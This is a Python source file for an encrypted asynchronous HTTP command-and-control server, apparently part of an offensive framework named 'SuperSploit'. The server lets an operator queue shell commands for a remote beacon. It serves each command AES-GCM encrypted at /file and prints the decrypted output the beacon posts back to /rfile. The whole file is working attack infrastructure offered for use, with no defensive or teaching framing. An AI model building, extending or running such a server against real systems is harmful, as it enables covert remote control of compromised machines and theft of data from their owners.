import asyncio
import base64
import threading
import sys
import os

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    import hashlib
    HAS_CRYPTO = True
except ImportError:
    print("[-] Error: 'cryptography' Python library required for AES-256 C2.")
    print("[*] Please run: pip install cryptography")
    sys.exit(1)

# Framework integration: Try to get the XOR_KEY from the database if available
try:
    from core.database import DatabaseManagment
    from core.license_manager import LicenseManager
    db = DatabaseManagment.get()
    XOR_KEY = db.get("XOR_KEY", "SuperSploitKey").encode()
    PORT = int(db.get("LPORT", 8000))
except ImportError:
    XOR_KEY = b"SuperSploitKey"
    PORT = 8000

    framework_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
    if framework_root not in sys.path:
        sys.path.append(framework_root)
    try:
        from core.license_manager import LicenseManager
    except ImportError:
        class LicenseManager:
            @staticmethod
            def gate_access(f):
                print(f"\n[!] ACCESS DENIED: '{f}' is a SuperSploit Pro feature.")
                print("[*] Standalone license validation failed. Please run via the main CLI.")
                return False

# Global asyncio queue for thread-safe task management
task_queue = None

# Derive a 256-bit (32-byte) AES key from the framework's master string using SHA-256
AES_KEY = hashlib.sha256(XOR_KEY).digest() if HAS_CRYPTO else b""

def aes_encrypt(data, key):
    """Handles AES-256-GCM encryption with dynamic 12-byte IV/Nonce"""
    if isinstance(data, str):
        data = data.encode()
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    return nonce + aesgcm.encrypt(nonce, data, None)

def aes_decrypt(data, key):
    """Handles AES-256-GCM decryption with 12-byte IV prepended"""
    aesgcm = AESGCM(key)
    nonce = data[:12]
    ciphertext = data[12:]
    return aesgcm.decrypt(nonce, ciphertext, None)

async def handle_client(reader, writer):
    """Asynchronous custom HTTP parser and handler"""
    global task_queue
    
    try:
        # Read the Request Line (e.g., "GET /file HTTP/1.1")
        request_line = await reader.readline()
        if not request_line:
            return
            
        request_line = request_line.decode('utf-8').strip()
        parts = request_line.split()
        if len(parts) < 2:
            return
            
        method, path = parts[0], parts[1]
        
        # Parse Headers to find Content-Length (needed for POST)
        content_length = 0
        while True:
            header_line = await reader.readline()
            header_line = header_line.decode('utf-8').strip()
            if not header_line:
                break # Empty line signifies end of headers
            
            h_parts = header_line.split(":", 1)
            if len(h_parts) == 2 and h_parts[0].strip().lower() == 'content-length':
                content_length = int(h_parts[1].strip())

        if method == "GET" and path == "/file":
            # The beacon requests tasks from /file
            response_body = b""
            
            # Check if a task is immediately available in the queue
            if not task_queue.empty():
                task = task_queue.get_nowait()
                response_body = base64.b64encode(aes_encrypt(task, AES_KEY))
                task_queue.task_done()
                
            response_headers = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Type: text/plain\r\n"
                f"Content-Length: {len(response_body)}\r\n"
                "Connection: close\r\n\r\n"
            ).encode('utf-8')
            
            writer.write(response_headers + response_body)
            await writer.drain()

        elif method == "POST" and path == "/rfile":
            # The beacon returns data to /rfile
            if content_length > 0:
                post_data = await reader.readexactly(content_length)
                try:
                    # 1. Base64 Decode and AES-256-GCM Decrypt the response
                    decoded_data = base64.b64decode(post_data)
                    final_output = aes_decrypt(decoded_data, AES_KEY).decode('utf-8', errors='ignore')

                    print(f"\n[+] Beacon Callback Response:")
                    print("-" * 40)
                    print(final_output.strip())
                    print("-" * 40)
                    print("C2-Beacon> ", end="", flush=True)

                except Exception as e:
                    print(f"\n[-] Failed to decrypt beacon data: {e}")
                    
            response_headers = (
                "HTTP/1.1 200 OK\r\n"
                "Content-Length: 3\r\n"
                "Connection: close\r\n\r\n"
                "OK\n"
            ).encode('utf-8')
            
            writer.write(response_headers)
            await writer.drain()
            
        else:
            # 404 Not Found
            response_headers = "HTTP/1.1 404 Not Found\r\nConnection: close\r\n\r\n".encode('utf-8')
            writer.write(response_headers)
            await writer.drain()

    except Exception as e:
        # Ignore broken pipe or connection reset errors common in socket programming
        pass
    finally:
        writer.close()
        try:
            await writer.wait_closed()
        except Exception:
            pass

async def main_server():
    """Starts the asyncio TCP server"""
    global task_queue
    task_queue = asyncio.Queue()
    
    server = await asyncio.start_server(handle_client, '0.0.0.0', PORT)
    print(f"[*] SuperSploit Async HTTP C2 Server listening on port {PORT}")
    print(f"[*] Master Key (AES-256 Derived): {XOR_KEY.decode()}")
    print("[*] Asynchronous Tasking Enabled. Type commands below.")
    print("-" * 40)
    print("C2-Beacon> ", end="", flush=True)
    
    async with server:
        await server.serve_forever()

def start_event_loop(loop):
    """Background thread worker to run the asyncio loop"""
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main_server())

if __name__ == "__main__":
    if not LicenseManager.gate_access("Async HTTP C2 Server"):
        sys.exit(1)

    # Create the event loop and start it in a background daemon thread
    loop = asyncio.new_event_loop()
    server_thread = threading.Thread(target=start_event_loop, args=(loop,), daemon=True)
    server_thread.start()

    # Interactive Tasking Loop (Main Thread)
    try:
        while True:
            cmd = input().strip()
            if not cmd:
                print("C2-Beacon> ", end="", flush=True)
                continue
            if cmd.lower() in ["exit", "quit"]:
                print("[*] Shutting down C2 server.")
                sys.exit(0)
            
            # Safely inject the task into the background event loop's queue
            loop.call_soon_threadsafe(task_queue.put_nowait, cmd)
            print(f"[*] Task queued: '{cmd}' (Awaiting next beacon...)")
            print("C2-Beacon> ", end="", flush=True)
            
    except KeyboardInterrupt:
        print("\n[*] Shutting down.")
        sys.exit(0)